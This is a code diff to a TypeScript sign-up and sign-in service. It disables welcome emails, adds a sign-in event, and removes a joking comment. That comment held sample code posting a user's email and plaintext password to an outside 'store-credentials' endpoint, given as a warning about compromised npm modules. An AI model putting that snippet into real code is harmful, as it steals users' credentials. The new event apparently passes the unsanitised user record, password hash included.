@@ -1,6 +1,6 @@
 import { Service, Inject } from 'typedi';
 import jwt from 'jsonwebtoken';
-import MailerService from './mailer';
+// import MailerService from './mailer';
 import config from '../config';
 import argon2 from 'argon2';
 import { randomBytes } from 'crypto';
@@ -15,7 +15,7 @@ import events from '../subscribers/events';
 export default class AuthService {
   constructor(
     @Inject('userModel') private userModel: Models.UserModel,
-    private mailer: MailerService,
+    // private mailer: MailerService,
     @Inject('logger') private logger,
     @EventDispatcher() private eventDispatcher: EventDispatcherInterface,
   ) {}
@@ -25,23 +25,6 @@ export default class AuthService {
   ): Promise<{ user: IUser; token: string }> {
     try {
       const salt = randomBytes(32);
-
-      /**
-       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
-       * require('http')
-       *  .request({
-       *     hostname: 'http://my-other-api.com/',
-       *     path: '/store-credentials',
-       *     port: 80,
-       *     method: 'POST',
-       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
-       *
-       * Just kidding, don't do that!!!
-       *
-       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
-       * watches every API call and if it spots a 'password' and 'email' property then
-       * it decides to steal them!? Would you even notice that? I wouldn't :/
-       */
       this.logger.silly('Hashing password');
       const hashedPassword = await argon2.hash(userInputDTO.password, { salt });
       this.logger.silly('Creating user db record');
@@ -56,8 +39,8 @@ export default class AuthService {
       if (!userRecord) {
         throw new Error('User cannot be created');
       }
-      this.logger.silly('Sending welcome email');
-      await this.mailer.SendWelcomeEmail(userRecord);
+      // this.logger.silly('Sending welcome email');
+      // await this.mailer.SendWelcomeEmail(userRecord);
 
       this.eventDispatcher.dispatch(events.user.signUp, { user: userRecord });
 
@@ -98,6 +81,7 @@ export default class AuthService {
       const user = userRecord.toObject();
       Reflect.deleteProperty(user, 'password');
       Reflect.deleteProperty(user, 'salt');
+      this.eventDispatcher.dispatch(events.user.signIn, userRecord);
       /**
        * Easy as pie, you don't need passport.js anymore :)
        */
